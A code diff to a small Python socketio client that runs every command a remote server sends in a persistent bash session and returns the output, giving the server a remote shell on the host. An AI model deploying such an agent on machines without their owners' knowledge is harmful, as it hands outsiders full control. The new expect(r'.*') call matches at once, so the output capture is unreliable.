@@ -1,7 +1,8 @@
+import pexpect
 import socketio
-import subprocess
 
 sio = socketio.Client()
+child = pexpect.spawn('/bin/bash', encoding='utf-8', timeout=None)  # Start a bash session
 
 @sio.event
 def connect():
@@ -15,10 +16,9 @@ def disconnect():
 def on_execute_command(data):
     command = data['command']
     print(f"Executing command: {command}")
-    try:
-        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
-    except subprocess.CalledProcessError as e:
-        output = e.output
+    child.sendline(command)  # Send command to the bash session
+    child.expect(r'.*')  # Wait for the command to complete
+    output = child.before  # Get the output of the command
     sio.emit('command_output', {'output': output})
 
 if __name__ == '__main__':
